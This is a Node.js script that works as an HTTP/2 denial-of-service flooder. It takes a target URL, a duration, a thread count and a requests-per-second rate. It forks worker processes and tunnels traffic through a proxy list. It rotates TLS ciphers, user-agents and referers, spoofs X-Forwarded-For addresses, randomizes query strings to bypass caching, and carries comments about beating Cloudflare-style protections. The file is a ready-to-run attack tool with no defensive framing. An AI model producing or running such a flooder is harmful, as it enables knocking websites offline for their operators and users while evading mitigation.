//HTTP-QUERY
//DEVELOPED BY ANONPRIXOR Touched by Darkceast
const url = require('url'),
    fs = require('fs'),
    http2 = require('http2'),
    http = require('http'),
    tls = require('tls'),
    crypto = require('crypto'),
    net = require('net'),
    request = require('request'),
    cluster = require('cluster'),
    fakeua = require('fake-useragent'),
    randstr = require('randomstring'),
    cplist = [
        "EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
        "EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
        "EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
    ],
    accept_header = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
    ],
    lang_header = [
        'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
        'en-US,en;q=0.5',
        'en-US,en;q=0.9',
        'de-CH;q=0.7',
        'da, en-gb;q=0.8, en;q=0.7',
        'cs;q=0.5'
    ],
    encoding_header = [
        'deflate, gzip;q=1.0, *;q=0.5',
        'gzip, deflate, br',
        '*'
    ],
    controle_header = [
        'no-cache',
        'no-store',
        'no-transform',
        'only-if-cached',
        'max-age=0'
    ],
    ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
    ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
    const sigalgs = [
        'ecdsa_secp256r1_sha256',
        'ecdsa_secp384r1_sha384',
        'ecdsa_secp521r1_sha512',
        'rsa_pss_rsae_sha256',
        'rsa_pss_rsae_sha384',
        'rsa_pss_rsae_sha512',
        'rsa_pkcs1_sha256',
        'rsa_pkcs1_sha384',
        'rsa_pkcs1_sha512',
      ];
      let SignalsList = sigalgs.join(':');
      this.sigalgs = SignalsList;
process.on('uncaughtException', function (e) {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
      //console.warn(e);
}).on('unhandledRejection', function (e) {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //  console.warn(e);
}).on('warning', e => {
    //  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    //  console.warn(e);
}).setMaxListeners(0);

if (process.argv.length < 5){console.log(`Script Modified by Darkceast\nUsage: node script.js <URL> <TIME> <THREAD> <REQ_PER_SEC> \nExample: node script.js https://tls.mrrage.xyz 100 5 100`); process.exit();}

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
}

function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
}

function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
}

function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
}

function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
}

function spoof() {
    return `${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}.${randstr.generate({ length: 1, charset: "12" })}${randstr.generate({ length: 1, charset: "012345" })}${randstr.generate({ length: 1, charset: "012345" })}`;
}

function randomByte() {
    return Math.round(Math.random() * 256);
}

function randomIp() {
    const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

    return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}
function ra1() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":25
    });
    return rsdat;
  }
function ra2() {
  const rsdat = randstr.generate({
      "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
      "length":25
  });
  return rsdat;
}
function ra3() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":25
    });
    return rsdat;
  }
function ra4() {
  const rsdat = randstr.generate({
      "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
      "length":25
  });
  return rsdat;
}
const target = process.argv[2],
    time = process.argv[3],
    thread = process.argv[4],
    proxys = fs.readFileSync("alive1.txt", 'utf-8').toString().match(/\S+/g),
    key = fs.readFileSync("pass", 'utf-8').toString().match(/\S+/g),
    ref = fs.readFileSync("ref.txt", "utf-8").toString().match(/\S+/g),
    rps = process.argv[5];

function proxyr() {
    return proxys[Math.floor(Math.random() * proxys.length)];
}

function referer() {
    return ref[Math.floor(Math.random() * ref.length)];
}

if (cluster.isMaster) {
    const dateObj = new Date();
    var cock1 = request.jar();

    for (var bb = 0; bb < thread; bb++) {

        cluster.fork();

    }

    setTimeout(() => {

        process.exit(-1)

    }, time * 1000)

} else {


    function flood() {

        var parsed = url.parse(target);

        const uas = fakeua();

        var cipper = cipher();

        var proxy = proxyr().split(':');
        var ref1 = referer()
        var cookie = request.jar();

        var randIp = randomIp();

        var header = {
            'Pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace',
            ":method": "GET",
	    ":authority": parsed.host,
            ":path": parsed.path + "?" + ra1() + "?" + ra2() + "?" + ra3() + "?" + ra4() + "?prixor=%RAND%?%RAND%", 
	    ":scheme": "https",
            "X-Forwarded-For": randIp,
            "X-Forwarded-Host": randIp,
            "user-agent": uas,
            "Origin": target,
            "Cookie": cookie,
            "accept": accept(),
            "accept-encoding": encoding(),
            "accept-language": lang(),
	    "referer": ref1,
            "cache-control": controling(),
        }

        const agent = new http.Agent({
            keepAlive: true,
            keepAliveMsecs: 50000,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity
        });

        var req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method: 'CONNECT',
            path: parsed.host + ':443'
        }, function () {
            req.setSocketKeepAlive(true);
        }).on('error', () => {});

        req.on('connect', function (res, socket, head) {
            tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            tls.DEFAULT_ECDH_CURVE;
            tls.authorized = true;
            tls.sync = true;
                const tlsSocket = tls.connect({
                    host: parsed.host,
                    ciphers: cipper,
                    port: 443,
                    cloudflareTimeout: 5000,
                    cloudflareMaxTimeout: 15000,
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    echdCurve: "GREASE:X25519:x25519",
                    secure: true,
                    gzip: true,
                    decodeEmails: false,
                    requestCert: true,
                    sigalgs: this.sigalgs,
                    honorCipherOrder: true,
                    resolvewithFullResponse: true, //resolving site with full response
                    challengesToSolve: 10, //GUSTO KO TUMAAS BYPASS RATE KO E
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    sessionTimeout: 5000,
                    socket: socket,
                }, () => {


            const client = http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        protocol: "https:",
                        maxSessionMemory: 64000,
                        maxHeaderListSize: 262144,
                        maxDeflateDynamicTableSize: 4294967295,
                        enablePush: false
                    }
            }, function (session) {
                for (let i = 0; i < rps; i++) {
                    const req = session.request(header);
                    req.setEncoding('utf8');

                    req.on('data', (chunk) => {
                        // data += chunk;
                    });
                    req.on("response", (res) => {
                    
                        req.close();
                    })
                    req.end().on('error', () => {
                    
                    });
                }
            });

		})

    });

    req.end();

}

setInterval(() => {
    flood()
})
}

